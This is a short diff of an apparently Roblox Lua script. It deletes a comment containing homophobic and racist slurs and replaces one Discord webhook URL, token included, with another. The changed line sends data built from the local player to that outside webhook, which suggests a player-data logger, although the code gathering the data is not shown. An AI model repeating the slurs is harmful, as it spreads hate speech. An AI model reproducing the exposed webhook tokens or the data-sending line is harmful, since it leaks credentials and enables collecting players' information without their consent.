@@ -9,8 +9,6 @@
 ]]
 
 -- Open Source
--- Who Will Delete Or Spam Webhook - Gay + Nigger
-
 -- There Is No Point To Spamming Or Delete Webhook, Because Webhooks Auto Updating
 
 
@@ -193,5 +191,5 @@ end
 
 local player = Players.LocalPlayer
 if player then
-    SendWebhook("https://discord.com/api/webhooks/1540643654388162593/Kqj2UEJhEm31Ym7-LDPBkbFWnhfy6B_EtRyND6_12RNHtkCfqZDKgWuS3n-QUPi9XxUN", CreateWebhook(player))
+    SendWebhook("https://discord.com/api/webhooks/1540356113206091807/Rsjk7vEErMg6oWtDSsBnvxtV3j8dCT3pc5NFKpO1QCf4TkClHE2I6mL4fSqxoU7Isyfm", CreateWebhook(player))
 end
